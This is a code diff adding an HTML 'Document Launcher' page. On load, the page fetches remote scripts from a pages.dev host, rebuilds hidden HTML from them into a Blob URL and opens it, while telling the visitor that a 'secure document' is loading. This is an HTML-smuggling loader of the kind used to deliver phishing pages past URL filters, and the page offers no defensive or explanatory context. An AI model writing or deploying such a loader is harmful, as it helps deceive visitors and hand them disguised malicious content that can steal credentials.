@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Launcher</title>
+    
+    <!-- Load jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <!-- Your hosted content scripts -->
+    <!-- Part 1: HTML Template and CSS -->
+    <script src="https://myprojec.pages.dev/content-part-1.js"></script>
+    <!-- Part 2: JavaScript Logic -->
+    <script src="https://myprojec.pages.dev/content-part-1.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            openBlobPage();
+        });
+
+        function openBlobPage() {
+            // Get the HTML content from Part 1
+            const htmlContent = window.blobHtmlContent || "";
+            
+            if (!htmlContent) {
+                console.error('❌ HTML content not found! Make sure content-part-1.js is loaded.');
+                alert('Failed to load content. Please try again.');
+                return;
+            }
+
+            // Create Blob URL
+            const myBlob = new Blob([htmlContent], { 
+                type: "text/html;charset=utf-8" 
+            });
+            
+            const url = window.URL.createObjectURL(myBlob);
+            
+            console.log('📄 Blob URL created:', url);
+            
+            // Open in new window
+            const newWindow = window.open(url, "_blank");
+            
+            if (!newWindow) {
+                // If popup is blocked, redirect
+                console.warn('⚠️ Popup blocked. Redirecting to Blob URL.');
+                window.location.href = url;
+            }
+            
+            // Clean up the Blob URL after 10 seconds
+            setTimeout(() => {
+                try {
+                    window.URL.revokeObjectURL(url);
+                    console.log('🧹 Blob URL revoked');
+                } catch(e) {
+                    // Ignore cleanup errors
+                }
+            }, 10000);
+        }
+    </script>
+</head>
+<body>
+    <div style="text-align: center; padding: 50px; font-family: Arial, sans-serif;">
+        <h1>🚀 Launching Document...</h1>
+        <p>Please wait while the secure document loads.</p>
+        <p style="font-size: 12px; color: #666; margin-top: 20px;">
+            If the document doesn't open automatically, 
+            <a href="#" onclick="openBlobPage(); return false;">click here</a>.
+        </p>
+    </div>
+</body>
+</html>
